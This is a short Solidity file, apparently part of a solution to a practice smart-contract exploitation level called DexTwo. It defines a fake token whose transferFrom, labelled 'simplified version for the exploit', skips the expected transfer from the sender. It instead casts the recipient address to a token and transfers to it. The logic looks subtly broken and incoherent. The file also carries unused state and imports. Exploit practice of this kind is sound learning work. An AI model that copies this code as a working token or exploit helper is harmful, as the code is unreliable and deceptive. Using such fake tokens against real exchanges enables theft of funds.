pragma solidity ^0.8.0;

import "../levels/DexTwo.sol";
import "../libraries/SafeERC20.sol";

contract SwappableTokenTwo { 
    address private _dex;

    function setDexManual(address dexInstance) public {
        _dex = dexInstance;
    }

    // This is a simplified version for the exploit
    function transferFrom(address, address to, uint256 amount) external returns (bool) {
        IERC20 token = IERC20(to);
        return token.transfer(to, amount);
    }
}
